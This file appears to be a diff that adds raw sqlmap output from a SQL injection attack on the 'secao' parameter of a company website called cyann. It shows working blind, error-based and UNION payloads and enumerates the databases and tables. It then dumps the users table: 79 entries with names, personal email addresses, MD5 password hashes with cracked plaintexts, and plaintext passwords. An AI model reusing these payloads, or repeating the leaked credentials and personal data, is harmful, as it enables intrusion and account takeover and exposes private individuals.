@@ -1,0 +1,179 @@
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: secao=65 AND 3550=3550
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: secao=65 AND (SELECT 6522 FROM(SELECT COUNT(*),CONCAT(0x7176767171,(SELECT (ELT(6522=6522,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: secao=-5322 UNION ALL SELECT CONCAT(0x7176767171,0x6a725a6955415057546b,0x716b767a71)-- MmEk
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] cyann
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: secao=65 AND 3550=3550
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: secao=65 AND (SELECT 6522 FROM(SELECT COUNT(*),CONCAT(0x7176767171,(SELECT (ELT(6522=6522,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: secao=-5322 UNION ALL SELECT CONCAT(0x7176767171,0x6a725a6955415057546b,0x716b767a71)-- MmEk
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cyann
+[23 tables]
++--------------------------+
+| tb_areascontato          |
+| tb_clientes              |
+| tb_contatos              |
+| tb_depoimentos           |
+| tb_destaques             |
+| tb_emails                |
+| tb_fotos                 |
+| tb_galerias              |
+| tb_idiomas               |
+| tb_infogeral             |
+| tb_lojas                 |
+| tb_menu                  |
+| tb_newsletter_emails     |
+| tb_newsletter_emails_old |
+| tb_newsletter_grupos     |
+| tb_newsletter_info       |
+| tb_newsletter_links      |
+| tb_newsletter_templates  |
+| tb_posicao               |
+| tb_redesociais           |
+| tb_secao                 |
+| tb_templates             |
+| tb_usuarios              |
++--------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: secao=65 AND 3550=3550
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: secao=65 AND (SELECT 6522 FROM(SELECT COUNT(*),CONCAT(0x7176767171,(SELECT (ELT(6522=6522,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: secao=-5322 UNION ALL SELECT CONCAT(0x7176767171,0x6a725a6955415057546b,0x716b767a71)-- MmEk
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cyann
+Table: tb_usuarios
+[79 entries]
++------------+----------------------------+-------------------------------------------+------------------------------------+--------+--------+-----------+---------------------+
+| id_usuario | nome                       | senha                                     | login                              | status | acesso | senhaext  | data_cadastro       |
++------------+----------------------------+-------------------------------------------+------------------------------------+--------+--------+-----------+---------------------+
+| 11         | Marcos Lima                | 202cb962ac59075b964b07152d234b70 (123)    | marcos.lima@trupinterativa.com.br  | S      | S      | 123       | 2011-05-12 15:29:25 |
+| 12         | Galeria Geral              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lookbook@cyann.com.br              | S      | G      | 1234      | 2011-06-08 13:07:29 |
+| 8          | Murilo                     | 202cb962ac59075b964b07152d234b70 (123)    | murilo@trupinterativa.com.br       | S      | S      | 123       | 2011-05-05 19:07:58 |
+| 9          | Alexandre                  | 5b8add2a5d98b1a652ea7fd72d942dac          | afwitcoske@cyann.com.br            | S      | S      | 317       | 2011-05-06 09:37:37 |
+| 10         | Cyann                      | 5b8add2a5d98b1a652ea7fd72d942dac          | cyann@cyann.com.br                 | S      | S      | 317       | 2011-05-11 11:38:45 |
+| 13         | Juliana S. Mello           | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | julianasaadmello@bol.com.br        | S      | G      | 1234      | 2011-08-16 08:15:22 |
+| 14         | Simone Savi F. Witcoske    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | swsavi@hotmail.com                 | S      | G      | 1234      | 2011-08-16 08:19:54 |
+| 15         | Alessandra Munhoz          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | alessandra_munhoz@yahoo.com        | S      | G      | 1234      | 2011-08-17 12:04:05 |
+| 16         | Lidiane Urbano             | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lidianeurbano@hotmail.com          | S      | G      | 1234      | 2011-08-25 16:29:06 |
+| 17         | Pollyana Sanchez           | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | blanc@clubblanc.com.br             | S      | G      | 1234      | 2011-08-25 16:30:52 |
+| 18         | Voltz                      | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | comercial.cabral.voltz@hotmail.com | S      | G      | 1234      | 2011-08-30 12:10:47 |
+| 19         | Fiore Multimarcas          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | fioremultimarcas@gmail.com         | S      | G      | 1234      | 2011-09-02 17:15:02 |
+| 20         | Lilian Regina              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lilian-regina@hotmail.com          | S      | G      | 1234      | 2011-09-06 14:11:12 |
+| 21         | Rose Gomes                 | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | rosechick55@yahoo.com.br           | S      | G      | 1234      | 2011-09-14 08:22:50 |
+| 22         | Elizabete Ortiz            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | elizabete.ortiz@hotmail.com        | S      | G      | 1234      | 2011-09-19 16:06:31 |
+| 23         | Daniele Prado              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | danipcanton@yahoo.com.br           | S      | G      | 1234      | 2011-09-20 11:25:38 |
+| 24         | Monica                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | moniquinhabeg@yahoo.com.br         | S      | G      | 1234      | 2011-09-27 08:35:27 |
+| 25         | Tina                       | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | tina@distfutura.com.br             | S      | G      | 1234      | 2011-09-27 08:38:43 |
+| 26         | Anna Luiza B de Oliveira   | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lillyhas@gmail.com                 | S      | G      | 1234      | 2011-09-27 08:41:25 |
+| 27         | Lidiane B. Santana         | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lidi.b.santana@gmail.com           | S      | G      | 1234      | 2011-09-27 08:42:57 |
+| 28         | Succes                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | succes.tejo@gmail.com              | S      | G      | 1234      | 2011-10-03 09:30:30 |
+| 29         | Renata Moura               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | nksrenata@hotmail.com              | S      | G      | 1234      | 2011-10-03 12:02:10 |
+| 30         | Gisele                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | passarellaurbana@hotmail.com       | S      | G      | 1234      | 2011-10-03 15:41:16 |
+| 31         | Luciana Mara               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lucianamaradeazevedo@hotmail.com   | S      | G      | 1234      | 2011-10-04 08:49:19 |
+| 32         | Thaisa Lima                | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | Thaisamcz@hotmail.com              | S      | G      | 1234      | 2011-10-10 14:58:13 |
+| 33         | Ludmila Rodrigues          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | ludydamoda@hotmail.com             | S      | G      | 1234      | 2011-10-11 11:24:50 |
+| 34         | Juliana Correa             | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | juliana@lenceriaboutique.com       | S      | G      | 1234      | 2011-10-17 15:02:42 |
+| 35         | Lexie Rodriguez            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | rod.lexie@gmail.com                | S      | G      | 1234      | 2011-10-17 15:16:25 |
+| 36         | Sabrina Moretti            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | sabrinamoretti2@gmail.com          | S      | G      | 1234      | 2011-10-18 13:47:27 |
+| 37         | Sonia Saraiva              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | soniamama@globo.com                | S      | G      | 1234      | 2011-10-18 14:35:37 |
+| 38         | Andrea Kodama              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | dea_kodama@hotmail.com             | S      | G      | 1234      | 2011-10-28 11:31:55 |
+| 39         | Jaqueline Schmitz          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | jaque_schmitz@hotmail.com          | S      | G      | 1234      | 2011-10-28 11:35:39 |
+| 40         | Joziane Marques            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | joziane.marques@gmail.com          | S      | G      | 1234      | 2011-10-28 11:41:44 |
+| 41         | Isabelle França            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | belle.franca@hotmail.com           | S      | G      | 1234      | 2011-10-28 11:51:52 |
+| 42         | Leandra Valadares          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | leandravaladares@hotmail.com       | S      | G      | 1234      | 2011-10-28 11:57:09 |
+| 43         | Barbara                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | agataharaujo@hotmail.com           | S      | G      | 1234      | 2011-10-31 09:18:27 |
+| 44         | Juliana Pessate Pereira    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | juuupp@gmail.com                   | S      | G      | 1234      | 2011-10-31 11:20:27 |
+| 45         | Bruna                      | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | brucutait@hotmail.com              | S      | G      | 1234      | 2011-11-04 11:28:56 |
+| 46         | Adriana                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | adriadda@uol.com.br                | S      | G      | 1234      | 2011-11-04 11:32:39 |
+| 47         | Nadia Benedetti            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | nadia.benedetti@hotmail.com        | S      | G      | 1234      | 2011-11-04 11:34:17 |
+| 48         | Simone                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | sflpsantos@hotmail.com             | S      | G      | 1234      | 2011-11-07 09:24:14 |
+| 49         | Sonia Reis                 | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | soniammreis@yahoo.com.br           | S      | G      | 1234      | 2011-11-07 09:29:05 |
+| 50         | Phamella Magalhães         | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | phamellamagalhaes@hotmail.com      | S      | G      | 1234      | 2011-11-08 07:32:51 |
+| 51         | Eliane Daniela Severino    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | elianedaniela@ig.com.br            | S      | G      | 1234      | 2011-11-08 12:17:10 |
+| 52         | Divanir                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | divafeitosa@gmail.com              | S      | G      | 1234      | 2011-11-09 08:52:03 |
+| 53         | Diana                      | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | ditimoteo@hotmail.com              | S      | G      | 1234      | 2011-11-09 08:55:49 |
+| 54         | Rafaela                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | rafaela_boni@hotmail.com           | S      | G      | 1234      | 2011-11-14 09:08:50 |
+| 55         | Sylvia Kropf               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | sylvia.kropf@yahoo.com.br          | S      | G      | 1234      | 2011-11-14 09:10:29 |
+| 56         | Karin Müller               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | karinmuller67@gmail.com            | S      | G      | 1234      | 2011-11-14 09:13:55 |
+| 57         | Luana Carneiro             | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | luana.carneiro@uol.com.br          | S      | G      | 1234      | 2011-11-16 07:53:04 |
+| 58         | Oziandia Souza             | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | ozisouza1@gmail.com                | S      | G      | 1234      | 2011-11-16 16:41:54 |
+| 59         | Gogoia TV Globo            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | gogoia@tvglobo.com.br              | S      | G      | 1234      | 2011-11-18 09:24:21 |
+| 60         | Juliana, Adom              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | juliana@adom.com.br                | S      | G      | 1234      | 2011-11-18 09:25:45 |
+| 61         | Maira                      | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | maira_ludwig@hotmail.com           | S      | G      | 1234      | 2011-11-18 10:50:07 |
+| 62         | Aline Ribeiro              | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | alineribeiroadv@hotmail.com        | S      | G      | 1234      | 2011-11-22 09:35:29 |
+| 63         | Carolina Carneiro          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | c.carneiro@br.vuitton.com          | S      | G      | 1234      | 2011-11-22 11:53:01 |
+| 64         | Cintia                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | cicideluca@webcable.com.br         | S      | G      | 1234      | 2011-11-23 11:21:19 |
+| 65         | Gisele Rodrigues           | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | giselerodrigues66@yahoo.com.br     | S      | G      | 1234      | 2011-11-24 07:36:59 |
+| 66         | Fabinas                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | FABINAS@BOL.COM.BR                 | S      | G      | 1234      | 2011-11-29 11:04:29 |
+| 67         | Vanessa Ghidella Araujo    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | vanessaghidella@uol.com.br         | S      | G      | 1234      | 2011-12-05 11:54:17 |
+| 68         | Daniela                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | dani.yoshida@gmail.com             | S      | G      | 1234      | 2011-12-05 12:09:51 |
+| 69         | Jemima                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | jemiminh@hotmail.com               | S      | G      | 1234      | 2011-12-05 12:12:54 |
+| 70         | Raquel Guedes Lima Barbosa | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | fractalfinito@gmail.com            | S      | G      | 1234      | 2011-12-05 12:15:52 |
+| 71         | Valeria                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | cavadu@ig.com.br                   | S      | G      | 1234      | 2011-12-07 11:13:46 |
+| 72         | Ana Paula Nicolai          | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | paula_nicolai@hotmail.com          | S      | G      | 1234      | 2011-12-07 15:26:22 |
+| 73         | Adriana Andugar            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | dri_andugar@hotmail.com            | S      | G      | 1234      | 2011-12-08 11:05:32 |
+| 74         | Simone                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | catamarams@hotmail.com             | S      | G      | 1234      | 2011-12-08 11:09:03 |
+| 75         | Lilian                     | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lilian.greziou@abf.com.br          | S      | G      | 1234      | 2011-12-08 13:55:28 |
+| 76         | Bruna Rocha                | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | bruninhame2009@gmail.com           | S      | G      | 1234      | 2011-12-09 11:31:15 |
+| 77         | Cristina Munhos            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | cris.munhhoz@yahoo.com.br          | S      | G      | 1234      | 2011-12-12 09:12:28 |
+| 78         | simone-catamarâ            | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | catanarams@hotmail.com             | S      | G      | 1234      | 2011-12-13 08:54:43 |
+| 79         | Sandra Martins da Costa    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | sm_dacosta@hotmail.com             | S      | G      | 1234      | 2011-12-15 12:19:33 |
+| 80         | Adriana                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | pires.afmo@ig.com.br               | S      | G      | 1234      | 2011-12-15 16:55:11 |
+| 81         | Sandra Beles               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | sandrabeles@uol.com.br             | S      | G      | 1234      | 2011-12-16 18:05:16 |
+| 82         | Renata Ribeiro             | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | renata@mariadescolada.com.br       | S      | G      | 1234      | 2011-12-20 15:57:02 |
+| 83         | Iully Amaral               | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | lily_v1000@hotmail.com             | S      | G      | 1234      | 2012-01-03 16:10:59 |
+| 84         | Roberta                    | 81dc9bdb52d04dc20036dbd8313ed055 (1234)   | robertaescher@yahoo.com.br         | S      | G      | 1234      | 2012-01-09 08:22:04 |
+| 85         | Erik                       | b41c90aefbc0cc2a4a910a34af44c0c5          | erik@padronagem.com.br             | S      | S      | erik@2301 | 2012-05-29 15:13:04 |
+| 86         | Barbara                    | 3ab8a0a38872e08eb100c3e639ceec51 (170389) | barbara@cyann.com.br               | S      | S      | 170389    | 2013-09-27 15:51:40 |
++------------+----------------------------+-------------------------------------------+------------------------------------+--------+--------+-----------+---------------------+
+
